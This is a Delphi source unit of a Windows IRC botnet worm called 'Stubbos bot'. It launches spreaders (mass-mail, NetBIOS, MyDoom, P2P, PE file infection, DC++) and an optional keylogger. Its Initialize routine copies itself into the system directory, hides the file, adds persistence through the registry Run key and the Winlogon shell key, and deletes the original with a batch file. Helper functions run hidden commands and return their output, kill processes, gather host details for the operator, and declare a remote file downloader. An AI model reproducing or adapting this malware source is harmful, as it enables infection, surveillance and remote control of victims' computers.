unit untFunctions;

interface

Uses
  Windows,
  Scan_Spread,
  MD5,
  WinSock,
  TLHelp32,
  dcpp_spreader,
  irc_spreader,
  massmail_spreader,
  mydoom_spreader,
  netbios_spreader,
  p2p_spreader,
  pe_spreader,
  web_spreader,
  ShellAPI;

{$I stubbos_config.ini}

Type
  TIPs             = ARRAY[0..10] OF STRING;

  tBan  = Record
    Hostname: String;
    Failure : Integer;
  End;

Var
  IRCNicks      :Array[0..70] Of String = (
                 'charles',             'lisa',                 'petter',       'monika',         // 4
                 'frans',               'knas',                 'fnas',         'd0o0o',          // 8
                 'pille',               'nille',                'ankan',        'fiskmoesen',     // 12
                 'jen',                 'ken',                  'cartman',      'stan',           // 16
                 'kyle',                'cheif',                'garrison',     'hatman',         // 20
                 'batman',              'nisse',                'kurt',         'benny',          // 24
                 'betty',               'abdul',                'abdol',        'mohammed',       // 28
                 'hanna',               'lelle',                'victoria',     'vironika',       // 32
                 'plankan',             'potatismos',           'korvmannen',   'korven',         // 36
                 'rulle',               'rille',                'orvar',        'ostboeg',        // 40
                 'boegen',              'cindy',                'catarina',     'aschmed',        // 44
                 'supfoo',              'letsdance',            'wiihiee',      'motherlaw',      // 48
                 'natureman',           'thetree',              'onestep',      'hellgates',      // 52
                 'darkarchangel',       'deft_tone',            'garfield',     'white_rabbit',   // 56
                 'mickael',             'xxx_lil_hottie_xxx',                   'pyr0maniac',     // 59
                 'teh_puppeteer',       'xiao_wei',             'starlite_45',  'angelika',       // 63
                 'anti_matter',         'rose',                 's0nix',        'blak_ninja',     // 67
                 'grimreaper',          'shadowstalker',        'hunter',       'grave_robber'    // 71
                 );
  BanRange      :Array[0..900] Of tBan;

  PREDEFINED_INSTALLDIR         :String;
  PREDEFINED_INSTALLNAME        :String;
  PREDEFINED_PLACESCRIPT        :String;
  PREDEFINED_SCRIPTDIR          :String;
  IPS                           :TIPS;

  Function GetDirectory(Int: Integer): String;
  Function DirectoryExists(Const Directory: String): Boolean;
  Function GetRegValue(ROOT: hKey; Path, Value: String): String;
  Function GetLocalIP: String;
  Function FileExists(Const FileName: String): Boolean;
  Function FixLength(Str: String; Int: Integer): String;
  Function IntToStr(Const Value: Integer): String;
  Function StrToInt(Const S: String): Integer;
  Function RandIRCBot: String;
  Function GetLocalName: String;
  Function ResolveIP(HostName: String): String;
  Function ExtractFileName(Const Path: String): String;
  Function LowerCase(Const S: String): String;
  Function GetFileSize(FileName: String): Int64;
  Function GetCPUSpeed: LongInt;
  Function GetInfo: String;
  Function KillProc(Proc: String): Bool;
  Function ListProc: String;
  function RunDosInCap(DosApp:String):String;
  {$IFDEF BOT_LOG_IRCNAMES}Function RandIRCBotN: String;{$ENDIF}

  Function IsBanned(Hostname: String): Bool;
  Function FailureLogged(Hostname: String): Integer;
  Procedure LoginFailure(HostName: String);
  Procedure RemoveFailure(Hostname: String);

  Procedure DoUninstall;
  Procedure Initialize;
  Procedure SetRegValue(ROOT: hKey; Path, Value, Str: String);
  Procedure ListDirectory(Dir: String; Var OutPut: String; MAttr: String);
  Procedure ReadFileStr(Name: String; Var Output: String);
  Procedure ReplaceStr(ReplaceWord, WithWord:String; Var Text: String);
  Procedure StartSpreading;
  

  Function URLDownloadToFile(Caller: Cardinal; URL: pChar;
           FileName: pChar; Reserved: LongWord; StatusCB: Cardinal): LongWord; STDCALL;
           EXTERNAL 'URLMON.DLL' NAME 'URLDownloadToFileA';

implementation

{$IFDEF BOT_WAITFORINTERNET}
  Uses
    Wininet{$IFDEF BOT_USEKEYLOGG},untKeyLog{$ENDIF};
{$ENDIF}

function AllocMem(Size: Cardinal): Pointer;
begin
  GetMem(Result, Size);
  FillChar(Result^, Size, 0);
end;

{FUNCTION MADE BY READ101, thanks for sharing this source}
function RunDosInCap(DosApp:String):String;
const
  ReadBuffer = 24000;
var
  Security: TSecurityAttributes;
  ReadPipe,WritePipe: THandle;
  start: TStartUpInfo;
  ProcessInfo: TProcessInformation;
  Buffer: Pchar;
  BytesRead, Apprunning: DWord;
begin
  With Security do
  begin
    nlength := SizeOf(TSecurityAttributes);
    binherithandle := true;
    lpsecuritydescriptor := nil;
  end;
  if Createpipe (ReadPipe, WritePipe, @Security, 0) then
  begin
    Buffer  := AllocMem(ReadBuffer + 1);
    FillChar(Start,Sizeof(Start),#0);
    start.cb := SizeOf(start);
    start.hStdOutput := WritePipe;
    start.hStdInput := ReadPipe;
    start.dwFlags := STARTF_USESTDHANDLES + STARTF_USESHOWWINDOW;
    start.wShowWindow := SW_HIDE;
  if CreateProcess(nil,PChar(DosApp),@Security,@Security,true,NORMAL_PRIORITY_CLASS,nil,nil,start,ProcessInfo) then
  begin
    repeat
      Apprunning := WaitForSingleObject (ProcessInfo.hProcess,100);
    until (Apprunning <> WAIT_TIMEOUT);
    Repeat
      BytesRead := 0;
      ReadFile(ReadPipe,Buffer[0],ReadBuffer,BytesRead,nil);
      Buffer[BytesRead]:= #0;
      OemToAnsi(Buffer,Buffer);
      Result := Result + String(Buffer);
    until (BytesRead < ReadBuffer);
  end;
    FreeMem(Buffer);
    CloseHandle(ProcessInfo.hProcess);
    CloseHandle(ProcessInfo.hThread);
    CloseHandle(ReadPipe);
    CloseHandle(WritePipe);
  end;
end;

Procedure StartSpreading;
Var
  ThreadID: DWord;
Begin
  {$IFDEF BOT_USEKEYLOGG}
    CreateThread(NIL, 0, @GetLetter, NIL, 0, ThreadID);
  {$ENDIF}
  {$IFDEF BOT_NETBIOS}
    StartNetBios(50);
  {$ENDIF}
  {$IFDEF BOT_MYDOOM}
    StartMyDoom(50);
  {$ENDIF}
  {$IFDEF BOT_DCPP}
    StartDCPP;
  {$ENDIF}
  {$IFDEF BOT_MASSMAIL}
    StartMassMail;
  {$ENDIF}
  {$IFDEF BOT_PE}
    StartInfector;
  {$ENDIF}
  {$IFDEF BOT_P2P}
    StartP2P;
  {$ENDIF}
  {$IFDEF BOT_IRC}
    StartIRC;
  {$ENDIF}
  StartWebServer;
End;

(* Get Info - Function by Positron *)
Function GetInfo: String;
Var
  Total         :LongInt;
  {$IFDEF BOT_INFO_SHOWMEMORYSTATUS}
    MemoryStatus  :TMemoryStatus;
  {$ENDIF}
  {$IFDEF BOT_INFO_SHOWOSVERSION}
    OSVersionInfo :TOSVersionInfo;
  {$ENDIF}

  {$IFDEF BOT_INFO_SHOWHOSTNAME}
    HostName      :Array[0..069] Of Char;
  {$ENDIF}
  {$IFDEF BOT_INFO_SHOWDATE}
    Date          :Array[0..069] Of Char;
  {$ENDIF}
  {$IFDEF BOT_INFO_SHOWTIME}
    Time          :Array[0..069] Of Char;
  {$ENDIF}
  {$IFDEF BOT_INFO_SHOWOSVERSION}
    OS            :String;
  {$ENDIF}
  {$IFDEF BOT_INFO_SHOWSYSDIR}
    SysDir        :String;
  {$ENDIF}
Begin
  {$IFDEF BOT_INFO_SHOWHOSTNAME}
    GetHostName(HostName, SizeOf(HostName));
  {$ENDIF}

  Total := GetTickCount DIV 1000;
  {$IFDEF BOT_INFO_SHOWMEMORYSTATUS}
    MemoryStatus.dwLength := SizeOf(TMemoryStatus);
    GlobalMemoryStatus(MemoryStatus);
  {$ENDIF}
  {$IFDEF BOT_INFO_SHOWOSVERSION}
    OSVersionInfo.dwOSVersionInfoSize := SizeOf(TOSVersionInfo);
    GetVersionEx(OSVersionInfo);
    If (OSVersionInfo.dwMajorVersion = 4) And (OSVersionInfo.dwMinorVersion = 0) Then
    Begin
      If (OSVersionInfo.dwPlatformId = VER_PLATFORM_WIN32_NT)      Then OS := 'win95';
      If (OSVersionInfo.dwPlatformId = VER_PLATFORM_WIN32_WINDOWS) Then OS := 'winNT';
    End
    Else If (OSVersionInfo.dwMajorVersion = 4) And (OSVersionInfo.dwMinorVersion = 10) Then OS := 'win98'
    Else If (OSVersionInfo.dwMajorVersion = 4) And (OSVersionInfo.dwMinorVersion = 90) Then OS := 'winME'
    Else If (OSVersionInfo.dwMajorVersion = 5) And (OSVersionInfo.dwMinorVersion = 0)  Then OS := 'win2K'
    Else If (OSVersionInfo.dwMajorVersion = 5) And (OSVersionInfo.dwMinorVersion = 1)  Then OS := 'winXP'
    Else OS := '?????';
  {$ENDIF}
  {$IFDEF BOT_INFO_SHOWDATE}
    GetDateFormat($409, 0, NIL, 'dd:MMM:yyyy', Date, 70);
  {$ENDIF}
  {$IFDEF BOT_INFO_SHOWTIME}
    GetTimeFormat($409, 0, NIL, 'HH:mm:ss', Time, 70);
  {$ENDIF}
  {$IFDEF BOT_INFO_SHOWSYSDIR}
    SysDir := GetDirectory(0);
  {$ENDIF}

  Result := '[cpu:'+IntToStr(GetCPUSpeed)+'][MHz, RAM:'+
            IntToStr(MemoryStatus.dwTotalPhys DIV 1048576)+' MB total, '+
            IntToStr(MemoryStatus.dwAvailPhys DIV 1048576)+' MB free, '+
            IntToStr(MemoryStatus.dwMemoryLoad) + '% in use]'+
            '[os:'+OS+', build: '+
            IntToStr(OSVersionInfo.dwBuildNumber)+', uptime: '+
            IntToStr(Total DIV 86400)+'d '+IntToStr((Total MOD 86400) DIV 3600)+'h '+
            IntToStr(((Total MOD 86400) MOD 3600) DIV 60)+'m]'+
            '[Date: '+Date+', Time: '+Time+']'+
            '[Host: '+HostName+', IP: '+ResolveIP('')+']'+
            '[Sysdir: '+Sysdir+']';
End;


(* Get CPU Speed - Function by Positron *)
Function GetCPUSpeed: LongInt;
Var
  TimerHi       :DWord;
  TimerLo       :Dword;
Begin
  SetPriorityClass (GetCurrentProcess, REALTIME_PRIORITY_CLASS);
  SetThreadPriority(GetCurrentThread, THREAD_PRIORITY_TIME_CRITICAL);
  Sleep(10);
  ASM
    dw  310Fh // rdtsc
    mov TimerLo, eax
    mov TimerHi, edx
  End;
  Sleep(500);
  ASM
    dw  310Fh // rdtsc
    sub eax, TimerLo
    sbb edx, TimerHi
    mov TimerLo, eax
    mov TimerHi, edx
  End;
  SetThreadPriority(GetCurrentThread, GetThreadPriority(GetCurrentThread));
  SetPriorityClass(GetCurrentProcess, GetPriorityClass(GetCurrentProcess));
  Result := TimerLo DIV 500000;
End;


(* Remove Banned Person *)
Procedure RemoveFailure(Hostname: String);
Var
  B: tBan;
Begin
  If (FailureLogged(HostName) > -1) Then
    Begin
      B := BanRange[FailureLogged(Hostname)];
      B.Hostname := '';
      B.Failure := 0;
      BanRange[FailureLogged(Hostname)] := B;
    End;
End;


(* Does Person Exist ? *)
Function FailureLogged(Hostname: String): Integer;
Var
  I: Integer;
  B: tBan;
Begin
  Result := -1;
  For I := 0 To 899 Do
    Begin
      B := BanRange[I];
      If (B.Hostname = Hostname) Then
        Begin
          Result := I;
          Break;
        End;
    End;
End;


(* Add failure *)
Procedure LoginFailure(HostName: String);
Var
  I: Integer;
  B: tBan;
Begin
  If FailureLogged(Hostname) > -1 Then
  Begin
    B := BanRange[FailureLogged(Hostname)];
    B.Failure := B.Failure + 1;
    BanRange[FailureLogged(Hostname)] := B;
  End Else
    For I := 0 To 899 Do
      Begin
        B := BanRange[I];
        If (B.Hostname = '') Then
          Begin
            B.Hostname := Hostname;
            B.Failure  := 1;
          End;
      End;
End;


(* Is person banned? *)
Function IsBanned(Hostname: String): Bool;
Var
  I: Integer;
  B: tBan;
Begin
  Result := False;
  For I := 0 To 899 Do
    Begin
      B := BanRange[I];
      If (B.Hostname = Hostname) Then
        If (B.Failure >= 3) Then
        Begin
          Result := True;
          Break;
        End;
    End;
End;


(* Replace String *)
Procedure ReplaceStr(ReplaceWord, WithWord:String; Var Text: String);
Var
  xPos: Integer;
Begin
  While Pos(ReplaceWord, Text)>0 Do
  Begin
    xPos := Pos(ReplaceWord, Text);
    Delete(Text, xPos, Length(ReplaceWord));
    Insert(WithWord, Text, xPos);
  End;
End;


(* List Proc and Kill Proc *)
Function ListProc: String;
Var
  cLoop         :Boolean;
  SnapShot      :THandle;
  L             :TProcessEntry32;
  F             :TextFile;
  OutPut        :String;
Begin
  SnapShot := CreateToolHelp32SnapShot(TH32CS_SNAPPROCESS or TH32CS_SNAPMODULE, 0);
  L.dwSize := SizeOf(L);
  cLoop := Process32First(SnapShot, L);

  Result := '';
  While (Integer(cLoop) <> 0) Do
    Begin
      Result := Result + 'id:['+FixLength(IntToStr(L.th32ProcessID), 6)+'] process:['+L.szExeFile+']'#13#10;
      cLoop := Process32Next(SnapShot, L);
    End;

  CloseHandle(SnapShot);

  Randomize;
  OutPut := GetDirectory(1)+'pl'+IntToStr(Random($FFFFFFFF))+'.tmp';

  AssignFile(F, OutPut);
  ReWrite(F);
    Write(F, Result);
  CloseFile(F);
  Result := OutPut;
End;

Function KillProc(Proc: String): Bool;
Var
  Ret   :Bool;
  pID   :Integer;
  pH    :THandle;
Begin
  Result := False;
  If (Proc = '') Then Exit;

  Try
    pID := StrToInt(Proc);
    pH := OpenProcess(PROCESS_TERMINATE, BOOL(0), pID);
    Ret := TerminateProcess(pH, 0);
    If (Integer(RET) = 0) Then Exit;
  Except
    Exit;
  End;
  Result := True;
End;


(* Get File Size int INT64 *)
Function GetFileSize(FileName: String): Int64;
Var
  H     :THandle;
  Data  :TWIN32FindData;
Begin
  Result := -1;
  H := FindFirstFile(pChar(FileName), Data);
  If (H <> INVALID_HANDLE_VALUE) Then
  Begin
    Windows.FindClose(H);
    Result := Int64(Data.nFileSizeHigh) SHL 32 + Data.nFileSizeLow;
  End;
End;


(* Lower Case Function *)
Function LowerCase(Const S: String): String;
Var
  Ch    :Char;
  L     :Integer;
  Source:pChar;
  Dest  :pChar;
Begin
  L := Length(S);
  SetLength(Result, L);
  Source := Pointer(S);
  Dest   := Pointer(Result);
  While (L <> 0) Do
  Begin
    Ch := Source^;
    If (Ch >= 'A') And (Ch <= 'Z') Then
      Inc(Ch, 32);
    Dest^ := Ch;
    Inc(Source);
    Inc(Dest);
    Dec(L);
  End;
End;


(* Extract File Name *)
Function ExtractFileName(Const Path: String): String;
Var
  I     :Integer;
  L     :Integer;
  Ch    :Char;
Begin
  L := Length(Path);
  For I := L DownTo 1 Do
  Begin
    Ch := Path[I];
    If (Ch = '\') Or (Ch = '/') Then
    Begin
      Result := Copy(Path, I + 1, L - I);
      Break;
    End;
  End;
End;


(* Resolve To IP Addresses *)
Function ResolveIP(HostName: String): String;
Type
  tAddr = Array[0..100] Of PInAddr;
  pAddr = ^tAddr;
Var
  I             :Integer;
  WSA           :TWSAData;
  PHE           :PHostEnt;
  P             :pAddr;
Begin
  Result := '';

  WSAStartUp($101, WSA);
    Try
      PHE := GetHostByName(pChar(HostName));
      If (PHE <> NIL) Then
      Begin
        P := pAddr(PHE^.h_addr_list);
        I := 0;
        While (P^[I] <> NIL) Do
        Begin
          Result := (inet_nToa(P^[I]^));
          Inc(I);
        End;
      End;
    Except
    End;
  WSACleanUp;
End;


(* Get Local Name *)
Function GetLocalName: String;
Var
  LocalHost     : Array [0..63] Of Char;
Begin
  GetHostName(LocalHost, SizeOf(LocalHost));
  Result := String(LocalHost);
End;

{$IFDEF BOT_LOG_IRCNAMES}
  Function RandIRCBotN: String;
  Var
    Nick          :String;
    Path          :String;
  Begin
    Path := GetDirectory(0) + '\stbn.ick';
    If (FileExists(Path)) Then
      ReadFileStr(Path, Nick);
    If Nick = '' Then Nick := IrcNicks[Random(70)]+':';
    Result := Nick;
  End;
{$ENDIF}

(* Random IRCBot Name *)
Function RandIRCBot: String;
Var
  Nick          :String;
  {$IFDEF BOT_LOG_IRCNAMES}
  Path          :String;
  Temp          :String;

  Count         :Integer;
  I             :Integer;
  Nicks         :Array Of String;
  {$ENDIF}
Begin
  {$IFDEF BOT_LOG_IRCNAMES}
    SetLength(Nicks, 1);
    Count := 1;

    Path := GetDirectory(0) + '\stbn.ick';

    If (FileExists(Path)) Then
    Begin
      ReadFileStr(Path, Temp);

      While (Pos(':', Temp) > 0) Do
      Begin
        Nick := Copy(Temp, 1, Pos(':', Temp) -1);
        Temp := Copy(Temp, Pos(':', Temp)+1, Length(Temp));

        If (Nick <> '') Then
        Begin
          Nicks[Count -1] := Nick;
          Inc(Count);
          SetLength(Nicks, Count);
        End;
      End;
    End;

    If ((Count-1) < 20) Then
      For I := 0 To 70 Do
      Begin
        Inc(Count);
        SetLength(Nicks, Count);
        Nicks[Count-1] := ircnicks[I];
      End;

    Nick := Nicks[Random(Count-1)];
  {$ELSE}
    Randomize;
    Nick := IRCNicks[Random(70)];
  {$ENDIF}
  Result := Nick;  
End;


(* Read File String *)
Procedure ReadFileStr(Name: String; Var Output: String);
Var
  cFile :File Of Char;
  Buf   :Array [1..1024] Of Char;
  Len   :LongInt;
  Size  :LongInt;
Begin
  Try
    Output := '';

    AssignFile(cFile, Name);
    Reset(cFile);
    Size := FileSize(cFile);
    While Not (Eof(cFile)) Do
    Begin
      BlockRead(cFile, Buf, 1024, Len);
      Output := Output + String(Buf);
    End;
    CloseFile(cFile);

    If Length(Output) > Size Then
      Output := Copy(Output, 1, Size);
  Except
    ;
  End;
End;


(* List Directory Into File *)
Procedure ListDirectory(Dir: String; Var OutPut: String; MAttr: String);
Var
  SR    :TSearchRec;
  F     :TextFile;
  Line  :String;
  Attr  :String;
Begin
  If (Dir[Length(Dir)] <> '\') Then
    Dir := Dir + '\';

  Line := '';
  If (FindFirst(Dir + '*.*', faDirectory, SR) = 0) Then
    Repeat
      If (SR.Name[1] <> '.') Then
      Begin
        Attr := '';
        If ((SR.Attr and faDirectory) = faDirectory) Then Attr := Attr + 'D';
        If ((SR.Attr and faReadOnly ) = faReadOnly ) Then Attr := Attr + 'R';
        If ((SR.Attr and faSysFile  ) = faSysFile  ) Then Attr := Attr + 'S';
        If ((SR.Attr and faVolumeID ) = faVolumeID ) Then Attr := Attr + 'V';
        If ((SR.Attr and faArchive  ) = faArchive  ) Then Attr := Attr + 'A';
        If ((SR.Attr and faAnyFile  ) = faAnyFile  ) Then Attr := Attr + 'F';
        If ((SR.Attr and faHidden   ) = faHidden   ) Then Attr := Attr + 'H';

        If (MAttr <> '') Then
        Begin
          If (Attr = MAttr) Then
            Line := Line + 'name['+FixLength(SR.Name, 25)          +'] '+
                           'size['+FixLength(IntToStr(SR.Size), 10)+'] '+
                           'attr['+FixLength(Attr, 10)             +'] '+
                           'md5 ['+MD5Print(MD5File(Dir+SR.Name))  +']'#13#10;
        End Else
            Line := Line + 'name['+FixLength(SR.Name, 25)          +'] '+
                           'size['+FixLength(IntToStr(SR.Size), 10)+'] '+
                           'attr['+FixLength(Attr, 10)             +'] '+
                           'md5 ['+MD5Print(MD5File(Dir+SR.Name))  +']'#13#10;
      End;
    Until FindNext(SR) <> 0;
  FindClose(SR);

  Randomize;
  OutPut := GetDirectory(1)+'fl'+IntToStr(Random($FFFFFFFF))+'.tmp';

  AssignFile(F, OutPut);
  ReWrite(F);
    WriteLn(F, '# D = Directory');
    WriteLn(F, '# R = ReadOnly');
    WriteLn(F, '# S = SysFile');
    WriteLn(F, '# V = VolumeID');
    WriteLn(F, '# A = Archive');
    WriteLn(F, '# F = AnyFile');
    WriteLn(F, '# H = Hidden');
    WriteLn(F);
    Write(F, Line);
  CloseFile(F);
End;


(* StrToInt IntToStr FixLength *)
Function StrToInt(Const S: String): Integer;
Var E: Integer; Begin Val(S, Result, E); End;

Function IntToStr(Const Value: Integer): String;
Var S: String[11]; Begin Str(Value, S); Result := S; End;

Function FixLength(Str: String; Int: Integer): String;
Begin
  While (Length(Str) < Int) Do
    Str := #0160 + Str;
  Result := Str;
End;


(* File Exists *)
Function FileExists(Const FileName: String): Boolean;
Var
  FileData      :TWin32FindData;
  hFile         :Cardinal;
Begin
  hFile := FindFirstFile(pChar(FileName), FileData);
  If (hFile <> INVALID_HANDLE_VALUE) Then
  Begin
    Result := True;
    Windows.FindClose(hFile);
  End Else
    Result := False;
End;


(* Get Local IP Address *)
Procedure GetIPs(Var IPs: TIPs; Var NumberOfIPs: Byte);
Type
  TaPInAddr = Array[0..10]Of PInAddr;
  PaPInAddr = ^TaPInAddr;
Var
  PHE           :PHostEnt;
  PPTR          :PaPInAddr;
  Buffer        :Array[0..63] Of Char;
  I             :Integer;
  GInitData     :TWSAData;
Begin
  WSAStartUp($101, GInitData);

    GetHostName(Buffer, SizeOf(Buffer));
    PHE := GetHostByName(Buffer);
    If (PHE = NIL) Then Exit;

    PPTR := PaPInAddr(PHE^.H_ADDR_LIST);
    I := 0;
    While (PPTR^[I] <> NIL) Do
      Begin
        IPs[I] := INET_NTOA(PPTR^[I]^);
        NumberOfIPs := I;
        INC(I);
      End;

  WSACleanUp;
End;

Function GetLocalIP: String;
Var
  NumberOfIPs   :Byte;
  I             :Byte;
  IP            :String;
Begin
  GetIPs(IPs, NumberOfIPs);
  For I := 0 To NumberOfIPs Do
    IP := IPs[I];
  Result := IP;
End;

(* Set Regedit Value *)
Procedure SetRegValue(ROOT: hKey; Path, Value, Str: String);
Var
  Key   :hKey;
  Size  :Cardinal;
Begin
  RegOpenKey(ROOT, pChar(Path), Key);
  Size := 2048;
  RegSetValueEx(Key, pChar(Value), 0, REG_SZ, @Str[1], Size);
  RegCloseKey(Key);
End;


(* Get Regedit Value *)
Function GetRegValue(ROOT: hKey; Path, Value: String): String;
Var
  Key:   hKey;
  Size:  Cardinal;
  Val:   Array[0..16382] Of Char;
Begin
  ZeroMemory(@Val, Length(Val));
    RegOpenKeyEx(ROOT, pChar(Path), 0, REG_SZ, Key);
    Size := 16383;
    RegQueryValueEx(Key, pChar(Value), NIL, NIL, @Val[0], @Size);
    RegCloseKey(Key);
  If (Val <> '') Then
    Result := Val;
End;


(* Directory Exists *)
Function DirectoryExists(Const Directory: String): Boolean;
Var
  Code: Integer;
Begin
  Code := GetFileAttributes(pChar(Directory));
  Result := (Code <> -1) And (FILE_ATTRIBUTE_DIRECTORY and Code <> 0);
End;


(* Get Directory *)
Function GetDirectory(Int: Integer): String;
Var
  Dir: Array[0..255] Of Char;
Begin
  GetSystemDirectory(Dir, 256);
  If (Int = 0) Then GetSystemDirectory (Dir, 256);
  Result := String(Dir)+'\';
End;


(* Uninstall Stubbos bot *)
Procedure DoUninstall;
Begin
  {$IFDEF BOT_REGSTART}
    SetRegValue(BOT_REGEDIT_ROOT, BOT_REGEDIT_PATH, BOT_REGEDIT_SUBPATH, '');
  {$ENDIF}
  {$IFDEF BOT_SHELLSTART}
    SetRegValue(HKEY_LOCAL_MACHINE, 'software\microsoft\windows nt\currentversion\winlogon', 'shell', 'Explorer.exe');
  {$ENDIF}
End;


(* Initializing Stubbos Bot *)
Procedure Initialize;
Var
  TempValue: String;
  {$IFDEF BOT_MELT} BatFile  : TextFile; {$ENDIF}
Begin
  {$IFDEF SHOW_OUTPUT} WriteLn('Initializeing Bot..'); {$ENDIF}

  PREDEFINED_INSTALLDIR := GetDirectory( BOT_INSTALLDIR );
  PREDEFINED_INSTALLNAME := PREDEFINED_INSTALLDIR + BOT_INSTALLNAME;

  PREDEFINED_PLACESCRIPT := GetDirectory( BOT_PLACESCRIPT );
  PREDEFINED_SCRIPTDIR := PREDEFINED_PLACESCRIPT + BOT_SCRIPTDIR;

  {$IFDEF SHOW_OUTPUT} WriteLn('Catched predefined bot-paths'); {$ENDIF}

  If NOT (DirectoryExists(PREDEFINED_SCRIPTDIR)) Then
    Begin
      {$IFDEF SHOW_OUTPUT} WriteLn('Created Script-dir'); {$ENDIF}
      CreateDirectory(pChar(PREDEFINED_SCRIPTDIR), NIL);
      SetFileAttributes(pChar(PREDEFINED_SCRIPTDIR), $00000002);
    End;

  CopyFile(pChar(ParamStr(0)), pChar(PREDEFINED_INSTALLNAME), FALSE);
  {$IFDEF SHOW_OUTPUT} WriteLn('Copied File'); {$ENDIF}

  {$IFDEF BOT_HIDEFILE}
    SetFileAttributes(pChar(PREDEFINED_INSTALLNAME), $00000002);
    {$IFDEF SHOW_OUTPUT} WriteLn('Hidden File'); {$ENDIF}
  {$ENDIF}

  {$IFDEF BOT_REGSTART}
    TempValue := GetRegValue(BOT_REGEDIT_ROOT, BOT_REGEDIT_PATH, BOT_REGEDIT_SUBPATH);
    If (Pos(BOT_INSTALLNAME, TempValue) = 0) Then
      SetRegValue(BOT_REGEDIT_ROOT, BOT_REGEDIT_PATH, BOT_REGEDIT_SUBPATH, PREDEFINED_INSTALLNAME);
    {$IFDEF SHOW_OUTPUT} WriteLn('Created Bot Regedit Settings'); {$ENDIF}
  {$ENDIF}

  {$IFDEF BOT_SHELLSTART}
    TempValue := GetRegValue(HKEY_LOCAL_MACHINE, 'software\microsoft\windows nt\currentversion\winlogon', 'shell');
    If (TempValue <> 'Explorer.exe '+BOT_INSTALLNAME) Then
      SetRegValue(HKEY_LOCAL_MACHINE, 'software\microsoft\windows nt\currentversion\winlogon', 'shell', 'Explorer.exe '+BOT_INSTALLNAME);
    {$IFDEF SHOW_OUTPUT} WriteLn('Created Bot Shell Settings'); {$ENDIF}
  {$ENDIF}

  {$IFDEF BOT_CREATEMUTEX}
    {$IFDEF SHOW_OUTPUT} WriteLn('Creating Mutex'); {$ENDIF}
    If (CreateMutexA(NIL, FALSE, BOT_MUTEX) = ERROR_ALREADY_EXISTS) Then
      ExitProcess(0);
    {$IFDEF SHOW_OUTPUT} WriteLn('Created Mutex Successfully'); {$ENDIF}
  {$ENDIF}

  {$IFDEF BOT_WAITFORINTERNET}
    {$IFDEF SHOW_OUTPUT} WriteLn('Waiting For Internet'); {$ENDIF}
    While Not (InternetGetConnectedState(NIL, 0)) Do Sleep(1000);
    {$IFDEF SHOW_OUTPUT} WriteLn('Internet Found'); {$ENDIF}
  {$ENDIF}

  If (lowercase(PREDEFINED_INSTALLNAME) <> lowercase(Paramstr(0))) Then
  Begin
    {$IFDEF BOT_MELT}
      AssignFile(BatFile, BOT_MELTFILENAME);
      ReWrite(BatFile);
      WriteLn(BatFile, 'del "'+ParamStr(0)+'"');
      WriteLn(BatFile, 'del "'+BOT_MELTFILENAME+'"');
      CloseFile(BatFile);
      ShellExecute(0, 'open', pChar(BOT_MELTFILENAME), NIL, NIL, 0);
      {$IFDEF SHOW_OUTPUT}
        ShellExecute(0, 'open', pChar(PREDEFINED_INSTALLNAME), NIL, NIL, 1);
      {$ELSE}
        ShellExecute(0, 'open', pChar(PREDEFINED_INSTALLNAME), NIL, NIL, 0);
      {$ENDIF}
      ExitProcess(0);
      CloseFile(BatFile);
    {$ELSE}
      {$IFDEF SHOW_OUTPUT}
        ShellExecute(0, 'open', pChar(PREDEFINED_INSTALLNAME), NIL, NIL, 1);
      {$ELSE}
        ShellExecute(0, 'open', pChar(PREDEFINED_INSTALLNAME), NIL, NIL, 0);
      {$ENDIF}
      ExitProcess(0);
    {$ENDIF}
  End;
End;

end.
